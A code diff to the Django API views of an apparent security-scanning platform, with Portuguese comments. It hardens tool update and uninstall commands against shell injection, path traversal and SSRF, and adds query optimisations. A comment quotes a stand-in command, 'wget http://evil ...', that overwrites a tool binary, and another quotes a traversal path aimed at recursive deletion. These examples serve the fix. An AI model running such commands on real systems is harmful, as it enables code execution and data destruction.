@@ -1,13 +1,16 @@
 import os
 import re
+import shlex
 import socket
+import hmac
 import logging
 import requests
 import validators
 import requests
 
 from ipaddress import IPv4Network
-from django.db.models import CharField, Count, F, Q, Value
+from django.db.models import CharField, Count, F, IntegerField, Max, OuterRef, Prefetch, Q, Subquery, Value
+from django.db.models.functions import Coalesce
 from django.utils import timezone
 from packaging import version
 from django.template.defaultfilters import slugify
@@ -42,6 +45,47 @@ from celery.exceptions import TimeoutError as CeleryTimeoutError
 
 
 logger = logging.getLogger(__name__)
+
+
+# Onda 2 (#13) — hardening da execução de comandos de tool vindos do DB.
+# UpdateTool/UninstallTool compõem comandos a partir de campos controlados por admin
+# (update_command / install_command / github_clone_path). Com run_command(shell=True)
+# um metacaractere nesses campos vira RCE por chaining/subshell/redirect; mesmo com
+# shell=False (shlex.split) um segmento hostil pode virar option/path injection. Estes
+# guards rejeitam metacaracteres de shell e validam segmentos de caminho antes de executar.
+_SHELL_META_RE = re.compile(r'[;&|`$(){}<>\n\r]')
+
+def _has_shell_meta(value):
+	"""True se a string contém metacaracteres de shell perigosos (chaining/subshell/redirect)."""
+	return bool(_SHELL_META_RE.search(value or ''))
+
+def _is_safe_path_segment(value):
+	"""Nome/segmento de caminho seguro: alfanumérico + . _ - e sem começar com '-'."""
+	return bool(value) and bool(re.fullmatch(r'[A-Za-z0-9._-]+', value)) and not value.startswith('-')
+
+# Onda 2 (#13, revisão adversarial): allowlist REAL do binário base de um update_command.
+# run_command(shell=False) faz shlex.split, o que neutraliza chaining/subshell — mas NÃO
+# restringe QUAL binário roda: 'wget http://evil -O /go/bin/httpx' (sem metacaractere)
+# ainda executaria. Restringimos argv[0] aos package managers usados pelos tools default
+# + auto-update do próprio binário do tool. Tools custom com outro updater entram aqui.
+ALLOWED_UPDATE_BINARIES = frozenset({'git', 'go', 'pip', 'pip3', 'nuclei', 'subfinder', 'chaos'})
+
+def _update_command_base(update_command):
+	"""basename de argv[0] do update_command (via shlex), ou '' se vazio/inparseável."""
+	try:
+		argv = shlex.split(update_command or '')
+	except ValueError:
+		return ''
+	return os.path.basename(argv[0]) if argv else ''
+
+def _is_contained_tool_path(clone_path):
+	"""True se clone_path (após realpath) é filho DIRETO de /usr/src/github, sem metacaracteres
+	nem traversal — evita que um github_clone_path adulterado ('/usr/src/github/../../etc')
+	vire deleção arbitrária de diretório no `rm -rf`."""
+	if not clone_path or _has_shell_meta(clone_path):
+		return False
+	real = os.path.realpath(clone_path)
+	return os.path.dirname(real) == '/usr/src/github' and bool(os.path.basename(real))
 
 # Bounded timeout for outbound HTTP issued on the synchronous web request path so a
 # slow/unresponsive upstream can't pin a gunicorn/web worker indefinitely (OWASP A04-2).
@@ -81,12 +125,16 @@ class SensorFindingsImport(APIView):
 	O do cert; a nuvem é a autoridade)."""
 	permission_classes = []
 	authentication_classes = []
+	throttle_classes = []  # Onda 2 (#8): ingest máquina-a-máquina isento do throttle global da API
 
 	def post(self, request, *args, **kwargs):
 		from django.conf import settings
 		secret = getattr(settings, 'SURICATOOS_SENSOR_IMPORT_SECRET', '')
 		auth = request.META.get('HTTP_AUTHORIZATION', '')
-		if not secret or auth != f'Bearer {secret}':
+		# Onda 2 (#10): comparação em tempo constante — não vaza o segredo por timing.
+		# Compara em bytes (o header é atacante-controlado; um Authorization não-ASCII
+		# levantaria TypeError no compare_digest sobre str → 401 limpo em vez de 500).
+		if not secret or not hmac.compare_digest(auth.encode('utf-8', 'surrogateescape'), f'Bearer {secret}'.encode('utf-8')):
 			return Response({'error': 'unauthorized'}, status=401)
 		data = request.data or {}
 		tenant = (data.get('tenant') or '').strip()
@@ -322,7 +370,10 @@ class HackerOneProgramViewSet(viewsets.ViewSet):
 		elif str(exc) == "Invalid API credentials":
 			return Response({"error": _("Invalid HackerOne API credentials")}, status=status.HTTP_401_UNAUTHORIZED)
 		else:
-			return Response({"error": str(exc)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+			# Onda 2 (#14): loga server-side com traceback; ao cliente vai mensagem genérica
+			# (não vazar paths/stack/internals no corpo do 500).
+			logger.error('Unhandled HackerOne API error', exc_info=exc)
+			return Response({"error": _("An internal error occurred")}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
 
 class InAppNotificationManagerViewSet(viewsets.ModelViewSet):
 	"""
@@ -586,9 +637,28 @@ class ListTargetsDatatableViewSet(viewsets.ReadOnlyModelViewSet):
 	serializer_class = DomainSerializer
 
 	def get_queryset(self):
+		# Onda 3 (#19): eager-loading. select_related cobre a expansão depth=2 das FKs diretas
+		# de Domain (project/domain_info); prefetch_related('domains') alimenta o get_organization
+		# (Organization.domains reverse) em 0 query/linha. Fica no self.queryset p/ sobreviver ao
+		# self.queryset.filter() de filter_queryset. Output-invariante.
+		# annotate vuln_count (Count distinct — o get_vuln_count já lê obj.vuln_count, hoje sempre
+		# None por falta desta annotation) + recent_scan_id (= Max scanhistory id, o mesmo que
+		# get_recent_scan_id() ordenado por -id). distinct=True no Count porque o join reverso de
+		# scanhistory faz cross-join com vulnerability e inflaria a contagem sem ele. Espelha o
+		# padrão annotate já usado no dashboard (views.py get_most_common... / most_vulnerable).
+		qs = (
+			Domain.objects
+			.select_related('project', 'domain_info')
+			.prefetch_related('domains')
+			.annotate(
+				vuln_count=Count('vulnerability', filter=~Q(vulnerability__validation_status=Vulnerability.VALIDATION_FALSE_POSITIVE), distinct=True),
+				recent_scan_id=Max('scanhistory__id'),
+			)
+		)
 		slug = self.request.GET.get('slug', None)
 		if slug:
-			self.queryset = self.queryset.filter(project__slug=slug)
+			qs = qs.filter(project__slug=slug)
+		self.queryset = qs
 		return self.queryset
 
 	def filter_queryset(self, qs):
@@ -643,7 +713,10 @@ class WafDetector(APIView):
 			response['message'] = _('Invalid Domain/URL provided!')
 			return Response(response)
 
-		wafw00f_command = f'wafw00f {url}'
+		# Onda 2 (#5 SSRF): -r/--noredirect impede seguir 3xx do alvo p/ 169.254.169.254/interno.
+		# NB: não fecha o DNS-rebind entre o guard e a re-resolução do wafw00f — esse é o
+		# residual #12 (mitigação de infra: egress filtering + IMDSv2), ver security-onda2.md.
+		wafw00f_command = f'wafw00f -r {url}'
 		_unused, output = run_command(wafw00f_command, remove_ansi_sequence=True)
 		regex = r"behind (.*?) WAF"
 		group = re.search(regex, output)
@@ -1411,11 +1484,18 @@ class UninstallTool(APIView):
 
 		if 'go install' in tool.install_command:
 			tool_name = tool.install_command.split('/')[-1].split('@')[0]
+			# Onda 2 (#13): nome derivado do DB — valida o segmento antes de compor o rm.
+			if not _is_safe_path_segment(tool_name):
+				return Response({'status': False, 'message': _('Tool name is invalid; cannot uninstall.')})
 			uninstall_command = 'rm /go/bin/' + tool_name
 		elif 'git clone' in tool.install_command:
-			tool_name = tool.install_command[:-1] if tool.install_command[-1] == '/' else tool.install_command
-			tool_name = tool_name.split('/')[-1]
-			uninstall_command = 'rm -rf ' + tool.github_clone_path
+			# Onda 2 (#13, revisão adversarial): github_clone_path vem do DB. startswith é
+			# driblável por traversal ('/usr/src/github/../../etc' → rm apaga fora do dir);
+			# exige que o realpath seja filho DIRETO de /usr/src/github e usa o caminho
+			# NORMALIZADO no rm.
+			if not _is_contained_tool_path(tool.github_clone_path):
+				return Response({'status': False, 'message': _('Tool path is invalid; cannot uninstall.')})
+			uninstall_command = 'rm -rf ' + os.path.realpath(tool.github_clone_path)
 		else:
 			return Response({'status': False, 'message': _('Cannot uninstall tool!')})
 
@@ -1448,15 +1528,28 @@ class UpdateTool(APIView):
 
 		if not update_command:
 			return Response({'status': False, 'message': _('%(name)s has missing update command! Cannot update the tool.') % {'name': tool.name}})
-		elif update_command == 'git pull':
+		# Onda 2 (#13): update_command vem do DB — rejeita metacaracteres de shell p/ impedir
+		# que um comando adulterado vire RCE por chaining/subshell/redirect.
+		if _has_shell_meta(update_command):
+			return Response({'status': False, 'message': _('Update command contains unsafe characters and was blocked.')})
+		if update_command == 'git pull':
 			tool_name = tool.install_command[:-1] if tool.install_command[-1] == '/' else tool.install_command
 			tool_name = tool_name.split('/')[-1]
-			update_command = 'cd /usr/src/github/' + tool_name + ' && git pull && cd -'
+			if not _is_safe_path_segment(tool_name):
+				return Response({'status': False, 'message': _('Tool path is invalid; cannot update the tool.')})
+			# `git -C <dir> pull` dispensa shell (sem 'cd &&'), então roda com shell=False.
+			update_command = f'git -C /usr/src/github/{tool_name} pull'
 
-		
+		# Allowlist REAL do binário base (ver ALLOWED_UPDATE_BINARIES): shell=False só barra
+		# chaining, não impede rodar um binário arbitrário. Cobre git/go/pip/... e o
+		# auto-update do próprio tool (base == nome do tool).
+		base = _update_command_base(update_command)
+		if base not in ALLOWED_UPDATE_BINARIES and base != (tool.name or '').lower():
+			return Response({'status': False, 'message': _('Update command not allowed: base binary %(b)s is not in the allowlist.') % {'b': base or '?'}})
+
 		try:
-			run_command(update_command, shell=True)
-			run_command.apply_async(args=[update_command], kwargs={'shell': True})
+			run_command(update_command)
+			run_command.apply_async(args=[update_command])
 			return Response({'status': True, 'message': _('%(name)s updated successfully.') % {'name': tool.name}})
 		except Exception as e:
 			logger.error(str(e))
@@ -1664,7 +1757,9 @@ class CMSDetector(APIView):
 		try:
 			response = {}
 			cms_detector_command = f'python3 /usr/src/github/CMSeeK/cmseek.py'
-			cms_detector_command += ' --random-agent --batch --follow-redirect'
+			# Onda 2 (#5 SSRF): sem --follow-redirect. CMSeeK reflete o conteúdo buscado na
+			# resposta da API, então seguir 3xx→metadata/interno seria SSRF com exfiltração.
+			cms_detector_command += ' --random-agent --batch'
 			cms_detector_command += f' -u {url}'
 
 			_unused, output = run_command(cms_detector_command, remove_ansi_sequence=True)
@@ -1864,7 +1959,15 @@ class ListTodoNotes(APIView):
 class ListScanHistory(APIView):
 	def get(self, request, format=None):
 		req = self.request
-		scan_history = ScanHistory.objects.all().order_by('-start_scan_date')
+		# Onda 3 (#18, parcial): select_related das FKs serializadas (domain + project + o
+		# initiated_by do MinimalUserSerializer) — remove queries de FK por-linha. Os counts
+		# por-scan (subdomain/endpoint/vuln/progress) e a paginação (a resposta é lista pura;
+		# mudá-la p/ envelope exige validar o frontend) ficam p/ Onda 3b. Output-invariante.
+		scan_history = (
+			ScanHistory.objects
+			.select_related('domain', 'domain__project', 'initiated_by')
+			.order_by('-start_scan_date')
+		)
 		project = req.query_params.get('project')
 		if project:
 			scan_history = scan_history.filter(domain__project__slug=project)
@@ -2186,6 +2289,10 @@ class SubdomainsViewSet(viewsets.ReadOnlyModelViewSet):
 					.filter(scan_history__id=scan_id)
 					.exclude(screenshot_path__isnull=True))
 			return Subdomain.objects.filter(scan_history=scan_id)
+		# Bug pré-existente (achado na Onda 3): sem scan_id o get_queryset caía fora sem return
+		# → None → o paginador fazia len(None) → HTTP 500 num GET /api/listSubdomains/ sem params.
+		# Retorna vazio (a UI sempre passa scan_id; listar TODOS seria um dump sem filtro).
+		return Subdomain.objects.none()
 
 	def paginate_queryset(self, queryset, view=None):
 		if 'no_page' in self.request.query_params:
@@ -2472,6 +2579,45 @@ class SubdomainDatatableViewSet(viewsets.ReadOnlyModelViewSet):
 
 		if name:
 			self.queryset = self.queryset.filter(name=name)
+
+		# Onda 3 (#16): prefetch dos M2M + serializers aninhados. Sem isto o SubdomainSerializer
+		# dispara 1 query/linha por M2M (ip_addresses/technologies/waf/directories) + aninhados
+		# (IpSerializer.ports, DirectoryScanSerializer.directory_files) → ×500 do DataTable.
+		# Colapsa p/ ~6 queries constantes. Output-invariante. (Os 9 COUNTs por-linha e o hoist
+		# do is_interesting ficam p/ Onda 3b — precisam de verificação com DB, ver perf-onda3.md.)
+		self.queryset = self.queryset.prefetch_related(
+			Prefetch('ip_addresses', queryset=IpAddress.objects.prefetch_related('ports')),
+			'technologies',
+			'waf',
+			Prefetch('directories', queryset=DirectoryScan.objects.prefetch_related('directory_files')),
+		)
+
+		# Onda 3b (#16): substitui os 9 COUNTs por-linha por Subquery annotations correlacionadas
+		# (1 SQL, sem N+1). São tradução LITERAL das properties do model (filtram por
+		# subdomain__name + scan_history + exclude FALSE_POSITIVE). A property só adiciona o filtro
+		# de scan quando o subdomínio TEM scan_history — os method-fields do serializer usam a
+		# annotation só nesse caso (fallback à property p/ null-scan), então casa por construção.
+		def _vuln_sev(sev):
+			return Coalesce(Subquery(
+				Vulnerability.objects
+				.filter(subdomain__name=OuterRef('name'), scan_history=OuterRef('scan_history'), severity=sev)
+				.exclude(validation_status=Vulnerability.VALIDATION_FALSE_POSITIVE)
+				.values('subdomain__name').annotate(c=Count('id')).values('c'),
+				output_field=IntegerField()), 0)
+		self.queryset = self.queryset.annotate(
+			info_count=_vuln_sev(0), low_count=_vuln_sev(1), medium_count=_vuln_sev(2),
+			high_count=_vuln_sev(3), critical_count=_vuln_sev(4),
+			endpoint_count=Coalesce(Subquery(
+				EndPoint.objects
+				.filter(subdomain__name=OuterRef('name'), scan_history=OuterRef('scan_history'))
+				.values('subdomain__name').annotate(c=Count('id')).values('c'),
+				output_field=IntegerField()), 0),
+			subscan_count=Coalesce(Subquery(
+				SubScan.objects
+				.filter(subdomain__id=OuterRef('id'))
+				.values('subdomain__id').annotate(c=Count('id', distinct=True)).values('c'),
+				output_field=IntegerField()), 0),
+		)
 
 		return self.queryset
 
@@ -3114,6 +3260,23 @@ class VulnerabilityViewSet(viewsets.ReadOnlyModelViewSet):
 			qs = qs.filter(severity=severity)
 		if subdomain_id:
 			qs = qs.filter(subdomain__id=subdomain_id)
+		# Onda 3 (#17): eager-loading. O VulnerabilitySerializer usa Meta.depth=2 + fields='__all__'
+		# e get_scan_history/model_to_dict → sem isto, dezenas de queries POR LINHA (×500 do
+		# DataTable). select_related nas FKs (não muda o shape do JSON) + prefetch_related nos M2M
+		# (inclui os lidos por model_to_dict do scan_history). Antes do self.queryset p/ sobreviver
+		# ao .filter() de filter_queryset. Nomes de relação conferidos nos models.
+		qs = qs.select_related(
+			'scan_history', 'scan_history__domain', 'scan_history__scan_type',
+			'scan_history__initiated_by', 'scan_history__aborted_by',
+			'subdomain', 'subdomain__scan_history', 'subdomain__target_domain',
+			'endpoint', 'endpoint__scan_history', 'endpoint__target_domain', 'endpoint__subdomain',
+			'target_domain', 'target_domain__project',
+		).prefetch_related(
+			'tags', 'references', 'cve_ids', 'cwe_ids', 'vuln_subscan_ids',
+			'scan_history__emails', 'scan_history__employees', 'scan_history__buckets', 'scan_history__dorks',
+			'subdomain__technologies', 'subdomain__ip_addresses', 'subdomain__directories', 'subdomain__waf',
+			'endpoint__techs', 'endpoint__endpoint_subscan_ids',
+		)
 		self.queryset = qs
 		return self.queryset
 
